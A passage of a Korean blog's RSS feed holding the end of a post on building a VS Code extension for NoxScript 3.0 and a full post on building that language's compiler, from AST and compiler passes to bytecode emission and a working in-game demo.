<p>지금 사용자가 어떤 함수를 호출하려고 하는지, 몇번째 인자를 작성중인지에 대한 정보는 주어지지 않기 때문에 우리가 직접 문서를 파싱해서 알아내야 한다.</p>
<p>리턴은 SignatureHelp 오브젝트이고 가능한 함수 시그니쳐 목록을 나타내는 <em>signatures</em>와 현재 보여져야할 시크니쳐를 나타내는 <em>activeSignature</em>, 그리고 현재 하이라이팅 되어야 할 인자를 나타내는 <em>activeParameter</em>로 구성되어있다. 우리는 함수 오버로딩을 지원하지 않으므로 <em>signatures</em>는 항상 길이 1의 리스트가 되겠다.</p>
<p><script src="https://gist.github.com/brianairb/8cd6d2924920ad614c293dadbda9fd4b.js"></script></p>
<p>프로그래머가 작성한 함수인 user-defined 함수도 마찬가지로 파싱해서 signature help를 지원해줄 수 있다.</p>
<h5>Hover Info</h5>
<p>마지막으로 추가해줄 기능은 사용자가 특정 함수 이름 위에 마우스 오버를 하면 해당 함수의 signature를 보여주는 기능이다. 빌트인 함수인 경우에는 미리 만들어둔 리스트에서 반환하면 되고, user-defined 함수인 경우에는 해당 함수의 선언문을 파싱해서 반환하면 된다.</p>
<p><script src="https://gist.github.com/brianairb/19bc222b5b47bc93135c5d40e6d9130f.js"></script></p>
<p>&nbsp;</p>
<h4>Packaging</h4>
<p>이제 구현을 모두 마쳤으니 패키징을 해서 설치 가능한 extension으로 만들어주어야 한다.</p>
<p>vscode의 익스텐션 창에서 검색해서 나오게 하려면 Visual Studio 마켓플레이스에 공개적으로 익스텐션을 퍼블리쉬해도 되지만, 우리는 필요한 사용자가 설치할 수 있도록 릴리즈를 할 예정이므로 그냥 매뉴얼하게 패키징을 해준다. 다행히도 npm 모듈 중에 익스텐션을 쉽게 패키징 해주는 vsce라는 툴이 있다: npm install -g vsce</p>
<p>vsce 설치가 끝났으면 익스텐션의 서버/클라이언트 모두 빌드를 해주고 client의 package.json이 있는 디렉토리에서 &#8220;vsce package&#8221;를 실행하면 {name}-{version}.vsix 라는 익스텐션 패키지를 만들어준다. 요놈을 릴리즈하고 사용자는 다운로드 받아서 vscode에서 열거나 드래그/드롭하면 설치가 완료된다.</p>
<p>&nbsp;</p>
<p><img class="size-medium aligncenter" src="https://camo.githubusercontent.com/ae9d27eb7688d1627e283b3c73f6846992e58adf/687474703a2f2f692e67697068792e636f6d2f336f37544b6e5363423471504d6678346c4f2e676966" alt="" width="972" height="614" /></p>
<p>짜잔! 별 작업을 안하고도 새로운 언어인 NoxScript 3.0을 위한 겁나 fancy한 스크립트 에디터가 생겼다!</p>
<p>개발에 사용된 모든 소스코드는 <a href="https://github.com/NoxTools/vscode-noxscript" target="_blank">github</a>에 공개되어있다.</p>
<p>&nbsp;</p>
]]></content:encoded>
			<wfw:commentRss>https://www.bpak.org/blog/2016/08/nox-%ec%8a%a4%ed%81%ac%eb%a6%bd%ed%8a%b8-%ec%96%b8%ec%96%b4-%ec%84%a4%ea%b3%84-%eb%b0%8f-%ec%bb%b4%ed%8c%8c%ec%9d%bc%eb%9f%ac-%eb%a7%8c%eb%93%a4%ea%b8%b0-%ce%b1-3/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>[Nox] 스크립트 언어 설계 및 컴파일러 만들기 + α (2)</title>
		<link>https://www.bpak.org/blog/2016/08/nox-%ec%8a%a4%ed%81%ac%eb%a6%bd%ed%8a%b8-%ec%96%b8%ec%96%b4-%ec%84%a4%ea%b3%84-%eb%b0%8f-%ec%bb%b4%ed%8c%8c%ec%9d%bc%eb%9f%ac-%eb%a7%8c%eb%93%a4%ea%b8%b0-%ce%b1-2/</link>
		<comments>https://www.bpak.org/blog/2016/08/nox-%ec%8a%a4%ed%81%ac%eb%a6%bd%ed%8a%b8-%ec%96%b8%ec%96%b4-%ec%84%a4%ea%b3%84-%eb%b0%8f-%ec%bb%b4%ed%8c%8c%ec%9d%bc%eb%9f%ac-%eb%a7%8c%eb%93%a4%ea%b8%b0-%ce%b1-2/#comments</comments>
		<pubDate>Sat, 27 Aug 2016 22:49:43 +0000</pubDate>
		<dc:creator><![CDATA[Cai]]></dc:creator>
				<category><![CDATA[Computer in General]]></category>
		<category><![CDATA[Computer in General/Linux]]></category>
		<category><![CDATA[Computer in General/Windows]]></category>
		<category><![CDATA[Hacking/Study]]></category>
		<category><![CDATA[Hacking/Tools]]></category>
		<category><![CDATA[bytecode]]></category>
		<category><![CDATA[compiler]]></category>
		<category><![CDATA[nox]]></category>
		<category><![CDATA[parser]]></category>
		<category><![CDATA[pyparsing]]></category>
		<category><![CDATA[녹스]]></category>
		<category><![CDATA[컴파일러]]></category>

		<guid isPermaLink="false">https://www.bpak.org/blog/?p=2082</guid>
		<description><![CDATA[지난 포스팅에서는 우리가 만든 언어로 만들어진 프로그램을 파싱하는 parser를 만들었다. 이번 포스팅에서는 파싱된 token들을 가지고 AST를 만드는 과정을 소개한다. 또한, 만들어진 AST를 기반으로 bytecode를 emit하는 컴파일러도 제작한다. &#160; Abstract Syntax Tree 먼저 AST를 만들기&#46;&#46;&#46;]]></description>
				<content:encoded><![CDATA[<p>지난 <a href="https://www.bpak.org/blog/2016/08/nox-%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8A%B8-%EC%96%B8%EC%96%B4-%EC%84%A4%EA%B3%84-%EB%B0%8F-%EC%BB%B4%ED%8C%8C%EC%9D%BC%EB%9F%AC-%EB%A7%8C%EB%93%A4%EA%B8%B0-%CE%B1-1/" title="">포스팅</a>에서는 우리가 만든 언어로 만들어진 프로그램을 파싱하는 parser를 만들었다. 이번 포스팅에서는 파싱된 token들을 가지고 AST를 만드는 과정을 소개한다. 또한, 만들어진 AST를 기반으로 bytecode를 emit하는 컴파일러도 제작한다.</p>
<p>&nbsp;</p>
<h2>Abstract Syntax Tree</h2>
<p>먼저 AST를 만들기 전에 이 tree의 노드가 될 녀석들을 먼저 구현해야한다. 결과적으로 소스코드가 표현하는 &#8220;프로그램&#8221;을 나타내는 트리 구조의 AST를 만드는 것이 목표이다. 트리의 각 노드는 프로그램 구성 요소를 나타낸다.</p>
<h4>AST Nodes</h4>
<p>기본적으로 base class인 Node class를 만들어준다:</p>
<p><script src="https://gist.github.com/brianairb/a3153b7c9c72dee38018893ac687596e.js"></script></p>
<p>Node 클래스는 꽤 간단한데, 해당 노드의 자식 노드들을 담고 있는 <strong>children</strong> 프로퍼티, 현재 노드에서의 scope를 관장하는 <strong>_scope</strong> 프로퍼티 등을 가지고 있고, pre-order와 post-order 트리 순회 (tree traversal)를 위한 static method도 제공한다. 또한, 이 Node class를 상속하는 sub class 들도 만들어준다.</p>
<table>
<tbody>
<tr style="height: 24px;">
<th style="width: 150px; height: 24px; text-align: center;">Node Class</th>
<th style="width: 300px; height: 24px; border-right-width: 1px; border-right-style: solid; border-right-color: #cccccc; text-align: center;">Description</th>
<th style="width: 150px; height: 24px; text-align: center;">Node Class</th>
<th style="width: 300px; height: 24px; text-align: center;">Description</th>
</tr>
<tr style="height: 24px;">
<td style="width: 150px; height: 24px; text-align: center;">LiteralNode</td>
<td style="width: 300px; height: 24px; border-right-width: 1px; border-right-style: solid; border-right-color: #cccccc; text-align: left;">리터럴 노드. 해당 literal의 값과 올바른 타입을 보관한다.</td>
<td style="width: 150px; height: 24px; text-align: center;">LabelNode</td>
<td style="width: 300px; height: 24px; text-align: left;">레이블 노드. 해당 label을 보관한다.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 150px; height: 24px; text-align: center;">VarNode</td>
<td style="width: 300px; height: 24px; border-right-width: 1px; border-right-style: solid; border-right-color: #cccccc; text-align: left;">변수 노드. 해당 변수의 이름을 보관한다. 변수의 타입은 DeclNode 생성시 scope에 추가되어 관리된다.</td>
<td style="width: 150px; height: 24px; text-align: center;">DeclNode</td>
<td style="width: 300px; height: 24px; text-align: left;">변수 선언 노드. 선언시 타입 및 변수명을 보관한다. 또한, 배열 변수라면 배열의 크기를 저장한다.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 150px; height: 24px; text-align: center;">BinOpNode</td>
<td style="width: 300px; height: 24px; border-right-width: 1px; border-right-style: solid; border-right-color: #cccccc; text-align: left;">이항 연산자 노드. 해당 이항 연산의 연산자 (op)와 피연산자들 (lhs &amp; rhs)을 보관한다.</td>
<td style="width: 150px; height: 24px; text-align: center;">SubscriptNode</td>
<td style="width: 300px; height: 24px; text-align: left;">배열 참조 노드. 참조하는 배열의 이름과 인덱스를 나타내는 expression을 보관한다.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 150px; height: 24px; text-align: center;">AssignNode</td>
<td style="width: 300px; height: 24px; border-right-width: 1px; border-right-style: solid; border-right-color: #cccccc; text-align: left;">대입 연산자 노드. BinOpNode를 상속한다. 해당 대입 연산자에 대한 정보(lhs &amp; rhs)를 기록하고, 대입 동시에 선언하는 경우에는 선언 타입 또한 기록한다.</td>
<td style="width: 150px; height: 24px; text-align: center;">IfNode</td>
<td style="width: 300px; height: 24px; text-align: left;">If 노드. 해당 if문의 조건식, then에 해당하는 노드, 그리고 (존재한다면) else에 해당하는 노드를 보관한다.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 150px; height: 24px; text-align: center;">UnOpNode</td>
<td style="width: 300px; height: 24px; border-right-width: 1px; border-right-style: solid; border-right-color: #cccccc; text-align: left;">단항 연산자 노드. 해당 단항 연산의 연산자 (op)와 피연산자를 보관한다.</td>
<td style="width: 150px; height: 24px; text-align: center;">WhileNode</td>
<td style="width: 300px; height: 24px; text-align: left;">While 노드. 해당 while문의 조건식과 loop body에 해당하는 노드를 보관한다.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 150px; height: 24px; text-align: center;">CallNode</td>
<td style="width: 300px; height: 24px; border-right-width: 1px; border-right-style: solid; border-right-color: #cccccc; text-align: left;">함수 호출 노드. Callee와 파라미터들을 보관한다.</td>
<td style="width: 150px; height: 24px; text-align: center;">ForNode</td>
<td style="width: 300px; height: 24px; text-align: left;">For 노드. 해당 for문의 초기화, 조건식, 증감식, 그리고 loop body에 해당하는 노드를 보관한다.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 150px; height: 24px; text-align: center;">ReturnNode</td>
<td style="width: 300px; height: 24px; border-right-width: 1px; border-right-style: solid; border-right-color: #cccccc; text-align: left;">리턴 노드. 리턴 값을 보관한다.</td>
<td style="width: 150px; height: 24px; text-align: center;">BlockNode</td>
<td style="width: 300px; height: 24px; text-align: left;">Block 노드. { 와 } 사이에 감싸진 코드 블럭을 나타내며 해당 블럭에 포함되는 0개 이상의 노드를 보관한다.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 150px; height: 24px; text-align: center;">BreakNode</td>
<td style="width: 300px; height: 24px; border-right-width: 1px; border-right-style: solid; border-right-color: #cccccc; text-align: left;">Break 노드.</td>
<td style="width: 150px; height: 24px; text-align: center;">BuiltinNode</td>
<td style="width: 300px; height: 24px; text-align: left;">내장 함수 노드. 녹스 게임 내에 있는 built-in 함수 정보를 보관한다 (함수 번호, 리턴 타입, 함수명, 파라미터).</td>
</tr>
<tr style="height: 24px;">
<td style="width: 150px; height: 24px; text-align: center;">ContinueNode</td>
<td style="width: 300px; height: 24px; border-right-width: 1px; border-right-style: solid; border-right-color: #cccccc; text-align: left;">Continue 노드.</td>
<td style="width: 150px; height: 24px; text-align: center;">FuncNode</td>
<td style="width: 300px; height: 24px; text-align: left;">함수 노드. 함수 선언시 해당 함수의 리턴 타입, 함수명, 파라미터, 그리고 함수 body를 보관한다.</td>
</tr>
<tr style="height: 24.8125px;">
<td style="width: 150px; height: 24px; text-align: center;">GotoNode</td>
<td style="width: 300px; height: 24px; border-right-width: 1px; border-right-style: solid; border-right-color: #cccccc; text-align: left;">Goto노드. goto 문의 타겟 label을 보관한다. (언어 자체에선 지원하지 않지만, 컴파일 시 흐름제어문 처리를 위해 condition을 보관하여 조건부 goto를 지원한다).</td>
<td style="width: 150px; height: 24px; text-align: center;"> GlobalNode</td>
<td style="width: 300px; height: 24px; text-align: left;">사실 ProgramNode가 더 정확한 표현이겠지만, 컴파일하는 프로그램 자체를 나타내는 노드. gen_ast 메소드가 리턴하는 wrapper 라고 보면 된다.</td>
</tr>
</tbody>
</table>
<h4>Scope</h4>
<p>유효범위. 즉, 어떠한 변수나 함수를 선언했을 때 갖는 유효 범위를 알맞게 구성해주어야 한다. 이를 관리하기 위해 각 노드마다 <strong>_scope</strong>를 가지고 있고, 새로운 변수가 선언될 때마다 추가해주고 새로운 함수가 선언/정의될 때 그에 맞는 새로운 (empty) scope를 지정해주어야 한다. Base class 노드에서도 볼 수 있듯이, 대개는 자신만의 유효범위를 가지지 않고 부모 (parent) 노드의 scope를 상속한다. 사실 scope는 프로그램 전체를 나타내는 AST가 만들어지기 전까지는 완벽하게 알 수 없기 때문에, AST 생성 후 추가적인 pass를 돌려서 scope을 수정한다. 그렇다! 우리 컴파일러는 <a href="https://en.wikipedia.org/wiki/Multi-pass_compiler" target="_blank" title="">멀티패스 컴파일러</a>인것이다! -_-b</p>
<p>Scope pass는 다음과 같다:</p>
<p><script src="https://gist.github.com/brianairb/92338a5e13c144bd1001ca145acf7dba.js"></script></p>
<p>BUILTINS는 <a href="https://gist.github.com/brianairb/513df11a9a01fed073f5b5349a03b5cf" target="_blank" title="">builtins.py</a>에서 pycparser를 이용해서 <a href="https://gist.github.com/brianairb/49d7861b1d3b68f10b0816ab0f1aa23a" target="_blank" title="">builtins.h</a> 헤더파일을 파싱해서 빌트인 함수들의 signature를 추출해서 global scope에 넣어준다. builtins.h 파일은 컴파일러 뿐만 아니라 나중에 Visual Studio Code 에디터에서 Nox Script 3.0 언어 지원과 (빌트인 함수 자동완성 및 signature help 기능) doxygen을 이용한 <a href="https://noxtools.github.io/noxscript/builtins_8h.html" target="_blank" title="">built-in 함수 API 레퍼런스 documentation</a>을 자동생성 하기 위해 독립적인 파일로 관리한다.</p>
<h4>Utility/Helper</h4>
<p>마지막으로, 만들어지는 AST를 한 눈에 보거나 디버깅하기 쉽게 하기 위해 <strong>print_ast</strong> 같은 헬퍼 메소드를 만들어주면 유용하다. 구현은 코드에도 나와있지만 간단한 tree visitor를 만들어서 pre-order로 프린트를 해준다.</p>
<p>위의 내용을 토대로 완성된 ast.py는 <strong><a href="https://gist.github.com/brianairb/1eed7fb6009cd8cd6be4f57a91a55697" target="_blank" title="">여기</a></strong>서 확인 가능하다. (이후에 decompiler를 구현할 때 필요한 메타 정보/함수들도 포함 되어있지만 크게 상관 없다.)</p>
<p>&nbsp;</p>
<h2>Parser to AST</h2>
<p>이제 필요한 부품(?)들이 (parser + AST 구현체) 다 모였으니 조립을 해야한다.</p>
<p>앞서 말했듯이 pyparsing을 사용하면 이 작업이 무척이나 수월해지는데, 프로세스를 원하는 expression마다 <strong>setParseAction</strong>으로 콜백을 등록해주면 된다. Parser에게 받는 token들을 이용해서 바로 AST node들로 전환하기 위해, 각 노드 클래스 마다 <strong>from_tokens</strong>라는 메소드를 구현해놨다. 딱히 뭐 하는건 없고, token들을 읽어 들인 후 알맞게 해당 노드 클래스 오브젝트를 만들어서 반환한다.</p>
<p>여기서 잠깐 이전 포스팅에서 말했던 <strong>infixNotation</strong>에 대해서 언급할까 한다. Pyparsing은 되부름 하향 구문 분석 (-_-..혹은 <a href="https://en.wikipedia.org/wiki/Recursive_descent_parser" target="_blank" title="">recursive descent</a>)이라고 불리는 방식의 parser이다. 이 방식은 문법 정의는 매우 편하고 빠르게 개발할 수 있지만, 문법이 복잡해지면 <span style="text-decoration: underline;">겁나게</span> 느려진다는 단점이 있다. 이항 연산자 (binary operator) 같은 문법이 이러한 파서를 극한으로 몰고가는 주범인데, 사실 복잡한 문법을 지원하고 싶다면 <a href="https://en.wikipedia.org/wiki/LALR_parser" target="_blank" title="">LR parser</a>를 사용하는게 맞다. 하지만, LR parser는 보통 BNF 등으로 정의된 언어 문법을 토대로 parser 코드를 자동 생성하는 방식으로 사용하기 때문에 솔직히 parser 코드 자체를 사람이 이해하기는 매우 힘들다.. 그리고 parser만 따로 ship할 수 있는게 아니고 parser generator에 대한 의존성이 생겨버리므로, 피할 수 있다면 피하는게 건강에 좋다. 그리고 무엇보다.. 기껏 짜놓은거 버리고 새로 룰을 작성하고 삽질하기가 귀찮았다 (&#8230;).</p>
<p>그래서 기존의 pyparsing 내장 infixNotation을 버리고, <a href="https://en.wikipedia.org/wiki/Shunting-yard_algorithm" target="_blank" title="">Shunting-yard 알고리즘</a>으로 대체했다. 이전 포스팅에서 봤던 parser 코드와 이번 코드에 확연한 차이가 보여서 어리둥절 했다면 그 때문일것이다. 완성된 parser.py는 <a href="https://gist.github.com/brianairb/3e25a9961792c60405d78760d3ec209e" target="_blank" title=""><strong>여기</strong></a>서 확인하자.</p>
<div id="attachment_2137" style="width: 611px" class="wp-caption aligncenter"><a href="https://www.bpak.org/blog/wp-content/uploads/2016/08/ast.png" data-rel="lightbox-image-0" data-rl_title="" data-rl_caption="" title=""><img class="wp-image-2137" src="https://www.bpak.org/blog/wp-content/uploads/2016/08/ast.png" alt="AST output" width="601" height="528" /></a><p class="wp-caption-text">AST output of a simple test script</p></div>
<p>아주 이쁘다. 후훗.</p>
<h4>AST Compiler Passes</h4>
<p>이대로 완성된 AST를 가져다가 compile할 수 있으면 좋겠지만, 몇 가지 작업을 더 해주어야 한다 ㅠ_ㅠ..</p>
<p>위에서 소개된 scope pass말고도 컴파일하는데 도움을 주는 pass 몇 가지를 더 돌려야 하는데, (<a href="https://en.wikipedia.org/wiki/Dead_code_elimination" target="_blank" title="">dead code elimination</a>과 같은) 코드 최적화는 아니더라도 컴파일 타임 에러 등을 찾기 위한 <em>validation</em> 패스와 if, for, while 등의 흐름제어 노드들을 goto와 label로 바꾸어서 (어떻게 보면 어셈블리처럼) <em>flatten</em> 시켜주는 패스가 필요하다. 두가지 pass 모두 AST traversal을 통해 pre-order와 post-order에 각각 필요한 visitor들을 등록해서 처리한다.</p>
<p>Validation 패스는 우리가 AST 노드들을 만들때 구현해둔 validate 함수를 노드마다 호출하여 exception이 발생하지 않는지 확인하고, flatten 패스는 흐름 제어 노드들을 방문하며 다음과 같은 치환한다:</p>
<ul>
<li>if
<ul>
<li>if (cond) { then_body }
<ul>
<li><strong>goto</strong> <span style="text-decoration: underline;">end_label</span> on <em>cond</em></li>
<li><em>then_body</em></li>
<li><span style="text-decoration: underline;">end_label</span></li>
</ul>
</li>
<li>if (cond) { then_body } else { else_body }
<ul>
<li><strong>goto</strong> <span style="text-decoration: underline;">else_label</span> on <em>cond</em></li>
<li><em>then_body</em></li>
<li><strong>goto</strong> <span style="text-decoration: underline;">end_label</span> (unconditional)</li>
<li><span style="text-decoration: underline;">else_label</span></li>
<li><em>else_body</em></li>
<li><span style="text-decoration: underline;">end_label</span></li>
</ul>
</li>
</ul>
</li>
<li>while
<ul>
<li>while (cond) { loop_body }
<ul>
<li><span style="text-decoration: underline;">begin_label</span></li>
<li><strong>goto</strong> <span style="text-decoration: underline;">end_label</span> on <em>cond</em></li>
<li><em>loop_body</em></li>
<li><strong>goto</strong> <span style="text-decoration: underline;">begin_label</span> (unconditional)</li>
<li><span style="text-decoration: underline;">end_label</span></li>
</ul>
</li>
</ul>
</li>
<li>for
<ul>
<li>for (init; cond; inc) { loop_body }
<ul>
<li><em>init</em> (init이 존재한다면)</li>
<li><span style="text-decoration: underline;">begin_label</span></li>
<li><strong>goto</strong> <span style="text-decoration: underline;">end_label</span> on <em>cond</em></li>
<li><em>loop_body</em></li>
<li><span style="text-decoration: underline;">inc_label</span></li>
<li><em>inc</em> (inc가 존재한다면)</li>
<li><strong>goto</strong> <span style="text-decoration: underline;">begin_label</span> (unconditional)</li>
<li><span style="text-decoration: underline;">end_label</span></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><em>Note: 여기서 cond일 때 점프(goto)하는 이유는, 우리 컴파일러가 bytecode를 emit할 때 jz (jump if zero; 즉, false이면 점프) 코드를 내보낼것이기 때문이다.</em></p>
<p>Continue는 현재 포함된 loop을 찾은 이후에 for loop 이라면 루프의 <span style="text-decoration: underline;">inc_label</span>로 가는 <strong>goto</strong> 노드로 치환해주고 while loop이라면 루프의 <span style="text-decoration: underline;">begin_label</span>로 가는 <strong>goto</strong> 노드로 치환해준다. Break는 현재 포함된 loop을 찾은 이후에 루프의 <span style="text-decoration: underline;">end_label</span>로 가는 <strong>goto</strong> 노드로 치환해준다.</p>
<p>코드를 다 포함하려면 블로그 글이 너무 길어지니 완성된 passes.py는 <strong><a href="https://gist.github.com/brianairb/6133893bd7923bbd1b4d1684e4f61ab7" target="_blank" title="">여기</a></strong>서 확인하자.</p>
<p>&nbsp;</p>
<h2>AST to Bytecode!</h2>
<p>이제 드디어 대망의 시간이다. 바로 녹스 게임 내 엔진이 실행 가능한 bytecode를 생성하는 단계!</p>
<p>사실 어떤 opcode가 어떤 작업을 하는지, 인자로는 어떤것들을 얼마나 받는지 등 리버싱하는것 자체가 꽤나 큰 일이다.. (CTF 많이 해본 사람들은 이 노가다가 얼마나 귀찮은지 알테지.) 하지만 다행히도(?) 룸메이트가 이미 이 작업은 수 년전에 끝내놨기 때문에 ㅋㅋ 이미 만들어져있는 테이블을 보고 쉽게 python으로 만들어나갈 수 있었다.</p>
<p>녹스 맵 파일에 내장되는 스크립트 오브젝트는 bytecode만 있는건 아니다. 함수명 테이블, 스트링 테이블 등의 정보를 담고 있는 헤더가 동봉된다. 스크립트 오브젝트의 포맷은 다음과 같다:</p>
<ul>
<li>&#8220;SCRIPT03&#8221;</li>
<li>&#8220;STRG&#8221;</li>
<li>string 갯수 (DWORD)</li>
<li>[string 길이 (DWORD) + string] * string갯수</li>
<li>&#8220;CODE&#8221;</li>
<li>함수 갯수 (DWORD)</li>
<li>[<br />
&#8220;FUNC&#8221; +<br />
함수명 길이 (DWORD) + 함수명 +<br />
0 또는 1 (DWORD, 리턴값이 있으면 1 없으면 0) +<br />
인자 갯수 (DWORD) +<br />
&#8220;SYMB&#8221; +<br />
지역변수 갯수 +<br />
0 (DWORD, unused) +<br />
[지역변수 크기 (DWORD)] * 지역변수 갯수 +<br />
&#8220;DATA&#8221; +<br />
함수 코드 (bytecode) 길이 (DWORD) +<br />
함수 코드 bytecode data<br />
] * 함수 갯수</li>
</ul>
<p>녹스 스크립트 오브젝트의 bytecode opcode들은 모두 4-byte이다. 이것도 이거지만, 데이터를 패킹하는걸 보면 정말 비효율적이라는것을 알 수 있다 -_-ㅋㅋ</p>
<p>자, 그럼 이제 bytecode를 emit하는 일만 남았으니 시작해보자!</p>
<p>일단 단항 연산과 이항 연산을 하는 opcode 들은 dictionary로 따로 빼둔다 (UOPS_MAP, OPS_MAP 참고).</p>
<p><strong>gen_ast</strong>를 통해 AST의 루트 노드를 얻어오고, 위에서 언급한 AST pass들 부터 적용한다:</p>
<ul>
<li><strong>scope_pass</strong>: 프로그램 내부의 scope 정의</li>
<li><strong>validate_pass</strong>: 프로그램 컴파일 타임 오류 체크 (type mismatch 등)</li>
<li><strong>flatten_pass</strong>: 프로그램 내의 conditional과 loop 치환</li>
</ul>
<p>녹스 스크립트 오브젝트에서는 함수들마다 고유 인덱스가 있는데 0번 함수에는 항상 사용되지 않는 dummy 함수 하나와 1번 함수에 GLOBAL이라는 함수가 존재해야한다. 스트링 테이블에는 보통 스크립트 내에서 선언된 문자열이 들어가지만, 우리가 컴파일할 떄는 원본 소스코드를 쉽게 추출하기 위해서 0번째 문자열은 항상 소스코드 원본을 담았다.</p>
<p>컴파일을 하면서 각 함수에 대한 정보와 변수에 대한 정보를 알아야 하기 때문에, 관련 정보를 담을 class를 선언하고 사용한다 (Function, Variable 참고).</p>
<p>다음 순서대로 컴파일을 진행한다.</p>
<ul>
<li>함수 생성 / 정보 수집 (create_func_pass)
<ul>
<li>Pre-order visitor를 통해 AST를 탐색하며 FuncNode를 찾을 때 마다 컴파일러 컨텍스트에 Function 오브젝트를 만들어 넣어준다.</li>
<li>함수명, 함수번호, 인자 갯수, 리턴타입을 기록한다.</li>
</ul>
</li>
<li>전역변수 생성 /정보 수집 (create_globals_pass)
<ul>
<li>Post-order visitor를 통해 DeclNode (예: int x;)나 선언과 동시에 대입하는 AssignNode (예: int x = 7;)에 한해서 해당 노드의 <em>func</em> 프로퍼티 (변수가 속해 있는 함수)가 비어있다면, 즉 global variable (전역변수)라면 GLOBAL 함수로 옮겨준다. (녹스 내부에서는 GLOBAL 함수에서 선언된 변수들이 전역변수가 된다.)</li>
</ul>
</li>
<li>지역변수 생성 / 정보 수집 (create_locals_pass)
<ul>
<li>전역변수 패스와 마찬가지로 Pre-order visitor를 통해  DeclNode와 AssignNode를 탐색하며 해당 노드가 속한 함수의 locals에 Variable 오브젝트를 만들어 넣어준다.</li>
<li>변수 번호와 크기를 기록한다.</li>
</ul>
</li>
<li>함수 컴파일 / bytecode emit (compile_func_pass)
<ul>
<li>Pre-order visitor로 FuncNode들을 탐색하며 각 함수 노드마다 컴파일 한다.</li>
<li>함수 컴파일 시, 함수 안에 있는 노드들을 탐색하며 각 노드 타입마다 적절한 opcode와 인자값을 사용하여 bytecode를 만든다.</li>
</ul>
</li>
</ul>
<p>이렇게 스크립트 내에서 정의된 모든 함수들의 bytecode를 emit하고 나서는 위의 오브젝트 파일 포맷대로 데이터를 쓰면 된다.<br />
<script src="https://gist.github.com/brianairb/7b24aaa7f17c4eae2c2cea99fccd007b.js"></script><br />
컴파일러를 사용하기 쉽도록 아래와 같은 간단한 wrapper CLI를 만들어서 돌려준다.</p>
<p><script src="https://gist.github.com/brianairb/e95dc191ff0af3bc0808cbe9c4d7b227.js"></script></p>
<h4>Output</h4>
<div id="attachment_2151" style="width: 677px" class="wp-caption aligncenter"><a href="https://www.bpak.org/blog/wp-content/uploads/2016/08/compiler.png" data-rel="lightbox-image-1" data-rl_title="" data-rl_caption="" title=""><img class=" wp-image-2151" src="https://www.bpak.org/blog/wp-content/uploads/2016/08/compiler.png" alt="Compiler output" width="667" height="584" /></a><p class="wp-caption-text">Compiler output</p></div>
<p>우왓~ 컴파일 완료!!</p>
<p>이제 이 완성된 스크립트 오브젝트를 맵에 첨부시키기만 하면 된다.</p>
<p><a href="https://www.bpak.org/blog/wp-content/uploads/2016/08/mapedit.png" data-rel="lightbox-image-2" data-rl_title="" data-rl_caption="" title=""><img class="aligncenter wp-image-2153" src="https://www.bpak.org/blog/wp-content/uploads/2016/08/mapedit.png" alt="mapedit" width="611" height="498" /></a></p>
<p>맵 에디터에서 테스트 용으로 간단한 Wall 오브젝트들을 만들고, 그 중 (7, 7) 좌표에 있는 벽 오브젝트에 Scripted 라는 속성을 주었다. 이렇게 하면 이 벽의 &#8220;행동&#8221;을 스크립트를 통해 조종할 수 있게 된다. Open 체크박스에 체크를 안했으므로 이 &#8220;비밀벽&#8221;은 닫힌채로 시작한다.</p>
<h4>Demo</h4>
<p><img class="aligncenter wp-image-2154 size-full" src="https://www.bpak.org/blog/wp-content/uploads/2016/08/compressed.gif" alt="compressed" width="826" height="738" /></p>
<p>&nbsp;</p>
<p>성공! 데모를 위해서 맵이 초기화 된 지 3초 정도 이후에 WallOpen을 부르도록 스크립트를 살짝 수정했지만, 위의 데모에서 볼 수 있듯이 닫혀있던 (7, 7) 벽이 열렸다. 맵 에디터에서 우리의 스크립트 오브젝트 파일을 import/export 하는 기능을 추가했는데 이건 컴파일러와는 크게 상관 없으니 넘어가도록 한다.</p>
<p>다음 시리즈에서는 Nox Script 3.0 언어로 스크립트 개발을 쉽고 빠르게 할 수 있도록 Visual Studio Code의 language extension을 이용해서 VS Code에서 우리 언어의 syntax highlighting, auto-completion, function signature help 등등의 기능을 추가해주는 익스텐션을 만들어본다.</p>
<p>&nbsp;</p>
]]></content:encoded>
			<wfw:commentRss>https://www.bpak.org/blog/2016/08/nox-%ec%8a%a4%ed%81%ac%eb%a6%bd%ed%8a%b8-%ec%96%b8%ec%96%b4-%ec%84%a4%ea%b3%84-%eb%b0%8f-%ec%bb%b4%ed%8c%8c%ec%9d%bc%eb%9f%ac-%eb%a7%8c%eb%93%a4%ea%b8%b0-%ce%b1-2/feed/</wfw:commentRss>
		<slash:comments>1</slash:comments>
		</item>
		<item>
		<title>[Nox] 스크립트 언어 설계 및 컴파일러 만들기 + α (1)</title>
		<link>https://www.bpak.org/blog/2016/08/nox-%ec%8a%a4%ed%81%ac%eb%a6%bd%ed%8a%b8-%ec%96%b8%ec%96%b4-%ec%84%a4%ea%b3%84-%eb%b0%8f-%ec%bb%b4%ed%8c%8c%ec%9d%bc%eb%9f%ac-%eb%a7%8c%eb%93%a4%ea%b8%b0-%ce%b1-1/</link>
		<comments>https://www.bpak.org/blog/2016/08/nox-%ec%8a%a4%ed%81%ac%eb%a6%bd%ed%8a%b8-%ec%96%b8%ec%96%b4-%ec%84%a4%ea%b3%84-%eb%b0%8f-%ec%bb%b4%ed%8c%8c%ec%9d%bc%eb%9f%ac-%eb%a7%8c%eb%93%a4%ea%b8%b0-%ce%b1-1/#comments</comments>
		<pubDate>Fri, 26 Aug 2016 10:05:25 +0000</pubDate>
		<dc:creator><![CDATA[Cai]]></dc:creator>
				<category><![CDATA[Computer in General]]></category>
		<category><![CDATA[Computer in General/Linux]]></category>
		<category><![CDATA[Computer in General/Windows]]></category>
		<category><![CDATA[Hacking/Study]]></category>
		<category><![CDATA[Hacking/Tools]]></category>
		<category><![CDATA[compiler]]></category>
		<category><![CDATA[nox]]></category>
		<category><![CDATA[pyparsing]]></category>
		<category><![CDATA[컴파일러]]></category>

		<guid isPermaLink="false">https://www.bpak.org/blog/?p=2031</guid>
